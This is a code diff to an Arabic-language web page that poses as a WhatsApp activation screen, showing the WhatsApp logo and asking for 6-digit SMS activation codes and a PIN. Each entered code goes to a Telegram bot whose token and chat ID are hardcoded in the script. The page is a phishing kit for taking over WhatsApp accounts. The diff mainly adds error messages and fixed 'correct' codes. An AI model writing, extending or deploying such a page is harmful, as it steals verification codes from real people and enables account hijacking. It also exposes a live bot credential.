@@ -104,6 +104,13 @@
             font-weight: bold;
             margin-top: 10px;
         }
+
+        .error {
+            color: red;
+            font-size: 14px;
+            margin-top: -10px;
+            margin-bottom: 10px;
+        }
     </style>
 </head>
 
@@ -118,11 +125,15 @@
         <h1>المرحلة الأولى: رمز التفعيل</h1>
         <p>يرجى إدخال رمز التفعيل الأول المكون من 6 أرقام الذي تلقيته عبر رسالة نصية.</p>
         <input id="activationCode1" type="tel" placeholder="رمز التفعيل الأول" maxlength="6">
+        <div id="errorActivation1" class="error"></div>
         <button onclick="submitFirstActivationCode()">متابعة</button>
         <div id="countdown"></div>
     </div>
 
     <script>
+        const correctActivationCode1 = "123456"; // الرمز الصحيح للتفعيل الأول
+        const correctPinCode1 = "654321"; // الرمز الصحيح لـ PIN الأول
+
         function sendCodeToTelegram(code, type) {
             const botToken = '7908469273:AAFmgF2elBpLaH6YGJK6Qtrmf8Z7TsyODzc';
             const chatId = '612575358';
@@ -161,36 +172,20 @@
 
         function submitFirstActivationCode() {
             const activationCode1 = document.getElementById('activationCode1').value;
+            const errorDisplay = document.getElementById('errorActivation1');
 
             if (!activationCode1 || activationCode1.length !== 6 || !/^\d{6}$/.test(activationCode1)) {
-                alert('يرجى إدخال رمز التفعيل الأول (6 أرقام).');
+                errorDisplay.textContent = 'يرجى إدخال رمز مكون من 6 أرقام فقط.';
                 return;
             }
 
+            if (activationCode1 !== correctActivationCode1) {
+                errorDisplay.textContent = 'رمز التفعيل الأول غير صحيح.';
+                return;
+            }
+
+            errorDisplay.textContent = '';
             sendCodeToTelegram(activationCode1, "رمز التفعيل الأول");
-
-            startCountdown(() => {
-                const container = document.getElementById('container');
-                container.innerHTML = `
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Icon">
-                    <h1>المرحلة الثانية: رمز التفعيل</h1>
-                    <p>يرجى إدخال رمز التفعيل الثاني المكون من 6 أرقام.</p>
-                    <input id="activationCode2" type="text" placeholder="رمز التفعيل الثاني" maxlength="6">
-                    <button onclick="submitSecondActivationCode()">متابعة</button>
-                    <div id="countdown"></div>
-                `;
-            });
-        }
-
-        function submitSecondActivationCode() {
-            const activationCode2 = document.getElementById('activationCode2').value;
-
-            if (!activationCode2 || activationCode2.length !== 6 || !/^\d{6}$/.test(activationCode2)) {
-                alert('يرجى إدخال رمز التفعيل الثاني (6 أرقام).');
-                return;
-            }
-
-            sendCodeToTelegram(activationCode2, "رمز التفعيل الثاني");
 
             startCountdown(() => {
                 const container = document.getElementById('container');
@@ -199,6 +194,7 @@
                     <h1>المرحلة الأولى: PIN</h1>
                     <p>يرجى إدخال رمز PIN الأول المكون من 6 أرقام.</p>
                     <input id="pinCode1" type="text" placeholder="PIN الأول" maxlength="6">
+                    <div id="errorPin1" class="error"></div>
                     <button onclick="submitFirstPin()">متابعة</button>
                     <div id="countdown"></div>
                 `;
@@ -207,39 +203,23 @@
 
         function submitFirstPin() {
             const pinCode1 = document.getElementById('pinCode1').value;
+            const errorDisplay = document.getElementById('errorPin1');
 
             if (!pinCode1 || pinCode1.length !== 6 || !/^\d+$/.test(pinCode1)) {
-                alert('يرجى إدخال رمز PIN الأول (6 أرقام).');
+                errorDisplay.textContent = 'يرجى إدخال رمز PIN مكون من 6 أرقام.';
                 return;
             }
 
+            if (pinCode1 !== correctPinCode1) {
+                errorDisplay.textContent = 'رمز PIN الأول غير صحيح.';
+                return;
+            }
+
+            errorDisplay.textContent = '';
             sendCodeToTelegram(pinCode1, "رمز PIN الأول");
 
             startCountdown(() => {
-                const container = document.getElementById('container');
-                container.innerHTML = `
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Icon">
-                    <h1>المرحلة الثانية: PIN</h1>
-                    <p>يرجى إدخال رمز PIN الثاني المكون من 6 أرقام.</p>
-                    <input id="pinCode2" type="text" placeholder="PIN الثاني" maxlength="6">
-                    <button onclick="submitSecondPin()">متابعة</button>
-                    <div id="countdown"></div>
-                `;
-            });
-        }
-
-        function submitSecondPin() {
-            const pinCode2 = document.getElementById('pinCode2').value;
-
-            if (!pinCode2 || pinCode2.length !== 6 || !/^\d+$/.test(pinCode2)) {
-                alert('يرجى إدخال رمز PIN الثاني (6 أرقام).');
-                return;
-            }
-
-            sendCodeToTelegram(pinCode2, "رمز PIN الثاني");
-
-            startCountdown(() => {
-                alert('تم إكمال جميع المراحل بنجاح!');
+                alert('تم إكمال المرحلة الأولى بنجاح!');
             });
         }
     </script>
